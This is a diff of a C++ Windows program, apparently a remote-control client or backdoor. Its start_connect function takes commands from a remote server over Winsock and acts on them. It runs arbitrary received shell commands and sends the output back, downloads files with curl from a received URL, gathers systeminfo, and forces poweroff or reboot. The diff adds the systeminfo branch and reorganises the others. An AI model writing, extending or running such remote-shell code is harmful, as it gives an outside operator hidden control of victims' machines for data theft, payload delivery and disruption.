@@ -5,7 +5,7 @@
 using namespace std;
 
 void start_connect() {
-	
+
 	// 初始化WS
 	WSADATA ws;
 	int r = WSAStartup(MAKEWORD(2, 2), &ws);
@@ -38,7 +38,7 @@ void start_connect() {
 	}
 	while (true) {
 		string command;
-		int i  = RecvFrame(sock, command);
+		int i = RecvFrame(sock, command);
 		if (i < 0) {
 			cout << WSAGetLastError << endl;
 			return;
@@ -50,28 +50,35 @@ void start_connect() {
 				RecvFrame(sock, recv);
 				recv = "curl -O " + recv;
 				system(recv.c_str());
-				SendFrame(sock, "curl succeed");
-			}
-			else if (command == "cmd") {
-				string recv;
-				SendFrame(sock, "cmd command");
-				RecvFrame(sock, recv);
-				system("cls");
-				system(recv.c_str());
 				std::string output = GetConsoleContent();
 				SendFrame(sock, output);
 			}
-			else if (command == "poweroff") {
-				SendFrame(sock, "shutdown");
-				system("shutdown -s -f");
-			}
-			else if (command == "reboot") {
-				SendFrame(sock, "reboot");
-				system("shutdown -r -f");
-			}
-			else {
-				cout << "未知命令" << endl;
-			}
+		}
+		else if (command == "systeminfo") {
+			system("cls");
+			system("systeminfo");
+			string info = GetConsoleContent();
+			SendFrame(sock, info);
+		}
+		else if (command == "cmd") {
+			string recv;
+			SendFrame(sock, "cmd command");
+			RecvFrame(sock, recv);
+			system("cls");
+			system(recv.c_str());
+			std::string output = GetConsoleContent();
+			SendFrame(sock, output);
+		}
+		else if (command == "poweroff") {
+			SendFrame(sock, "shutdown");
+			system("shutdown -s -f");
+		}
+		else if (command == "reboot") {
+			SendFrame(sock, "reboot");
+			system("shutdown -r -f");
+		}
+		else {
+			cout << "未知命令" << endl;
 		}
 	}
 }
